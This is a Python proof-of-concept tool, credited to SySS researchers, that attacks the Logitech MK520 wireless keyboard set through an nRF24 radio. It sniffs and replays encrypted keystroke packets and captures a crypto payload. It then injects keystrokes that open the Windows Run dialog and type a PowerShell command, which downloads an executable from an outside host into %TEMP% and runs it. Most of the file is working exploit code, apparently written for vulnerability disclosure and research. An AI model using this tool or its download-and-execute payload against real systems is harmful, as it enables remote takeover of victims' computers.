#!/usr/bin/env python2
# -*- coding: utf-8 -*-

"""
  Cherry Attack

  by Matthias Deeg <matthias.deeg@syss.de> and
  Gerhard Klostermeier <gerhard.klostermeier@syss.de>

  Proof-of-Concept software tool to demonstrate the replay
  and keystroke injection vulnerabilities of the wireless desktop set
  Logitech MK520

  Copyright (C) 2016 SySS GmbH

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

__version__ = '0.8'
__author__ = 'Matthias Deeg, Gerhard Klostermeier'

import argparse
import logging
import pygame

from binascii import hexlify, unhexlify
from lib import keyboard
from lib import nrf24
from logging import debug, info
from pygame.locals import *
from time import sleep, time
from sys import exit

# constants
ATTACK_VECTOR   = u"powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'"

# THESE MAP TO THE BUTTONS YOU SHOULD PRESS WHILE INTERACTING WITH THE UI
# NOTE THAT THERE IS NO "IDLE" BUTTON. "IDLE" state happens when a mode is completed.
RECORD_BUTTON   = pygame.K_1                # record button
REPLAY_BUTTON   = pygame.K_2                # replay button
ATTACK_BUTTON   = pygame.K_3                # attack button
SCAN_BUTTON     = pygame.K_4                # scan button

#THESE ARE INTERNAL STATE, NOT the buttons to press
IDLE            = 0                         # idle state
RECORD          = 1                         # record state; Pressing 1 while in RECORD mode will toggle record mode off
REPLAY          = 2                         # replay state
SCAN            = 3                         # scan state
ATTACK          = 4                         # attack state

SCAN_TIME       = 2                         # scan time in seconds for scan mode heuristics
DWELL_TIME      = 0.1                       # dwell time for scan mode in seconds
KEYSTROKE_DELAY = 0.01                      # keystroke delay in seconds

# Logitech Unifying Keep Alive packet with 90 ms
KEEP_ALIVE_90 = unhexlify("0040005A66")
KEEP_ALIVE_TIMEOUT = 0.07


class LogitechAttack():
    """Logitech Attack"""

    def __init__(self, address=""):
        """Initialize Logitech Attack"""

        self.state = IDLE                           # current state
        self.channel = 2                            # used ShockBurst channel
        self.payloads = []                          # list of sniffed payloads
        self.kbd = None                             # keyboard for keystroke injection attacks
        self.screen = None                          # screen
        self.font = None                            # font
        self.statusText = ""                        # current status text
        self.address = address

        try:
            # initialize pygame variables
            pygame.init()
            self.icon = pygame.image.load("./images/syss_logo.png")
            self.bg = pygame.image.load("./images/logitech_attack_bg.png")

            pygame.display.set_caption("SySS Logitech Attack PoC")
            pygame.display.set_icon(self.icon)
            self.screen = pygame.display.set_mode((400, 300), 0, 24)
            self.font = pygame.font.SysFont("arial", 24)
#            self.screen.fill((255, 255, 255))
            self.screen.blit(self.bg, (0, 0))
            self.showInstructions()
            pygame.display.update()

            # set key repetition parameters
            pygame.key.set_repeat(250, 50)

            # initialize radio
            self.radio = nrf24.nrf24()

            # enable LNA
            self.radio.enable_lna()

            # start scanning mode
            self.setState(IDLE)
        except:
            # info output
            info("[-] Error: Could not initialize Logitech Attack")


    def showStatus(self, text, x = 30, y = 100):
        self.showText(text, x, y)


    def showText(self, text, x = 40, y = 140):
        output = self.font.render(text, True, (0, 0, 0))
        self.screen.blit(output, (x, y))


    def showInstructions(self):
        self.font = pygame.font.SysFont("arial", 16)
        self.showText("Press 1 for RECORD", 30, 180)
        self.showText("Press 2 for REPLAY", 30, 200)
        self.showText("Press 3 for ATTACK", 30, 220)
        self.showText("Press 4 for SCAN", 30, 240)
        self.font = pygame.font.SysFont("arial", 24)

    def checkForEscape(self):
        event = pygame.event.poll()
        return event.type == KEYDOWN and event.key == K_ESCAPE


    def setState(self, newState):
        """Set state"""
        if newState == RECORD:
            # set RECORD state
            self.state = RECORD
            self.statusText = "RECORDING"
        elif newState == REPLAY:
            # set REPLAY state
            self.state = REPLAY
            self.statusText = "REPLAYING"
        elif newState == SCAN:
            # set SCAN state
            self.state = SCAN
            self.statusText = "SCANNING"
        elif newState == ATTACK:
            # set ATTACK state
            self.state = ATTACK
            self.statusText = "ATTACKING"
        else:
            # set IDLE state
            self.state = IDLE
            self.statusText = "IDLE"


    def unique_everseen(self, seq):
        """Remove duplicates from a list while preserving the item order"""
        seen = set()
        return [x for x in seq if str(x) not in seen and not seen.add(str(x))]


    def run(self):
        # main loop
        last_keep_alive = time()
        running = True
        while running:
            for i in pygame.event.get():
                if i.type == QUIT:
                    running = False

                elif i.type == KEYDOWN:
                    info(i)
                    if i.key == K_ESCAPE:
                        if self.state == IDLE:
                            running = False
                        else:
                            self.setState(IDLE)

                    # record button state transitions
                    if i.key == RECORD_BUTTON:
                        # if the current state is IDLE change it to RECORD
                        if self.state == IDLE:
                            # set RECORD state
                            self.setState(RECORD)

                            # empty payloads list
                            self.payloads = []

                        # if the current state is RECORD change it to IDLE
                        elif self.state == RECORD:
                            # set IDLE state
                            self.setState(IDLE)

                    # play button state transitions
                    if i.key == REPLAY_BUTTON:
                        # if the current state is IDLE change it to REPLAY
                        if self.state == IDLE:
                            # set REPLAY state
                            self.setState(REPLAY)

                    # scan button state transitions
                    if i.key == SCAN_BUTTON:
                        # if the current state is IDLE change it to SCAN
                        if self.state == IDLE:
                            # set SCAN state
                            self.setState(SCAN)

                    # attack button state transitions
                    if i.key == ATTACK_BUTTON:
                        # if the current state is IDLE change it to ATTACK
                        if self.state == IDLE:
                            # set ATTACK state
                            self.setState(ATTACK)

            # show current status on screen
#            self.screen.fill((255, 255, 255))
            self.screen.blit(self.bg, (0, 0))
            self.showStatus(self.statusText)
            self.showInstructions()

            # update the display
            pygame.display.update()

            # state machine
            if self.state == RECORD:
                # receive payload
                value = self.radio.receive_payload()

                if value[0] == 0:
                    # split the payload from the status byte
                    payload = value[1:]

                    # add payload to list
                    self.payloads.append(payload)

                    # info output, show packet payload
                    info('Received payload: {0}'.format(hexlify(payload)))

            elif self.state == REPLAY:
                # remove duplicate payloads (retransmissions)
                payloadList = self.unique_everseen(self.payloads)
#                payloadList = self.payloads

                # replay all payloads
                for p in payloadList:
                    if len(p) == 22:
                        # transmit payload
                        self.radio.transmit_payload(p.tostring())

                        # info output
                        info('Sent payload: {0}'.format(hexlify(p)))

                        # send keep alive with 90 ms time out
                        self.radio.transmit_payload(KEEP_ALIVE_90)
                        last_keep_alive = time()

                        sleep(KEYSTROKE_DELAY)

                # set IDLE state after playback
                self.setState(IDLE)

            elif self.state == SCAN:
                # put the radio in promiscuous mode with given address
                if len(self.address) > 0:
                    self.radio.enter_promiscuous_mode(self.address[::-1])
                else:
                    self.radio.enter_promiscuous_mode()

                # set the initial channel
                self.radio.set_channel(SCAN_CHANNELS[0])

                # sweep through the defined channels and decode ESB packets in pseudo-promiscuous mode
                last_tune = time()
                channel_index = 0
                # Clear out any lingering button presses from earlier stages in the workflow
                pygame.event.clear()
                address = payload = None
                while True:
                    if self.checkForEscape():
                        break
                    # increment the channel
                    if len(SCAN_CHANNELS) > 1 and time() - last_tune > DWELL_TIME:
                        channel_index = (channel_index + 1) % (len(SCAN_CHANNELS))
                        self.radio.set_channel(SCAN_CHANNELS[channel_index])
                        last_tune = time()

                    # receive payloads
                    value = self.radio.receive_payload()
                    if len(value) >= 5:
                        # split the address and payload
                        address, payload = value[0:5], value[5:]

                        # convert address to string and reverse byte order
                        converted_address = address[::-1].tostring()
                        self.address = converted_address
                        break

                if not address:
                    # go back to idle state and back to the original entrypoint
                    self.setState(IDLE)
                    continue
                self.showStatus("Found keyboard")
                address_string = ':'.join('{:02X}'.format(b) for b in address)
                self.showText(address_string)

                # info output
                info("Found nRF24 device with address {0} on channel {1}".format(address_string, SCAN_CHANNELS[channel_index]))

                # put the radio in sniffer mode (ESB w/o auto ACKs)
                self.radio.enter_sniffer_mode(self.address)

                info("Searching crypto key")
                self.statusText = "SEARCH4CRYPTO"
                self.screen.blit(self.bg, (0, 0))
                self.showStatus(self.statusText, x=20)
                self.showInstructions()

                # update the display
                pygame.display.update()

                last_key = 0
                packet_count = 0
                crypto_payload = None

                # Clear out any lingering button presses from earlier stages in the workflow
                pygame.event.clear()
                while True:
                    if self.checkForEscape():
                        break

                    # receive payload
                    value = self.radio.receive_payload()

                    if value[0] == 0:
                        if len(payload) == 22:
                            # do some time measurement
                            last_key = time()

                        # split the payload from the status byte
                        payload = value[1:]

                        # increment packet count
                        if len(payload) == 22:
                            # only count Logitech Unifying packets with encrypted data (should be 22 bytes long)
                            packet_count += 1
                            crypto_payload = payload

                        # show packet payload
                        info('Received payload: {0}'.format(hexlify(payload)))

                    # heuristic for having a valid release key data packet
                    if packet_count >= 2 and time() - last_key > SCAN_TIME:
                        break

                if crypto_payload:
                    self.showText(u"Got crypto key!")

                    # info output
                    info('Got crypto key!')

                    # initialize keyboard
                    self.kbd = keyboard.LogitechKeyboard(crypto_payload.tostring())
                    info('Initialize keyboard')

                # set IDLE state after scanning
                self.setState(IDLE)

            elif self.state == ATTACK:
                if self.kbd != None:
                    # send keystrokes for a classic download and execute PoC attack
                    keystrokes = []
                    keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
                    keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
                    keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))

                    # send attack keystrokes
                    for k in keystrokes:
                        self.radio.transmit_payload(k)

                        # info output
                        info('Sent payload: {0}'.format(hexlify(k)))

                         # send keep alive with 90 ms time out
                        self.radio.transmit_payload(KEEP_ALIVE_90)
                        last_keep_alive = time()

                        sleep(KEYSTROKE_DELAY)

                    # need small delay after WIN + R
                    for i in range(5):
                         # send keep alive with 90 ms time out
                        self.radio.transmit_payload(KEEP_ALIVE_90)
                        last_keep_alive = time()
                        sleep(0.06)

                    keystrokes = self.kbd.getKeystrokes(ATTACK_VECTOR)
                    keystrokes += self.kbd.getKeystroke(keyboard.KEY_RETURN)

                    # send attack keystrokes with a small delay
                    for k in keystrokes:
                        self.radio.transmit_payload(k)

                        # info output
                        info('Sent payload: {0}'.format(hexlify(k)))

                        # send keep alive with 90 ms time out
                        self.radio.transmit_payload(KEEP_ALIVE_90)
                        last_keep_alive = time()

                        sleep(KEYSTROKE_DELAY)

                # set IDLE state after attack
                self.setState(IDLE)

            if time() - last_keep_alive > KEEP_ALIVE_TIMEOUT:
                # send keep alive with 90 ms time out
                self.radio.transmit_payload(KEEP_ALIVE_90)
                last_keep_alive = time()


# main program
if __name__ == '__main__':
    # setup logging
    level = logging.INFO
    logging.basicConfig(level=level, format='[%(asctime)s.%(msecs)03d]  %(message)s', datefmt="%Y-%m-%d %H:%M:%S")

    # init argument parser
    parser = argparse.ArgumentParser()
    parser.add_argument('-a', '--address', type=str, help='Address of nRF24 device')
    parser.add_argument('-c', '--channels', type=int, nargs='+', help='ShockBurst RF channel', default=range(2, 84), metavar='N')

    # parse arguments
    args = parser.parse_args()

    # set scan channels
    SCAN_CHANNELS = args.channels

    if args.address:
        try:
            # address of nRF24 keyboard (CAUTION: Reversed byte order compared to sniffer tools!)
            address = args.address.replace(':', '').decode('hex')[::-1][:5]
            address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1])
        except:
            info("Error: Invalid address")
            exit(1)
    else:
        address = ""

    # init
    poc = LogitechAttack(address)

    # run
    info("Start Logitech Attack v{0}".format(__version__))
    poc.run()

    # done
    info("Done.")

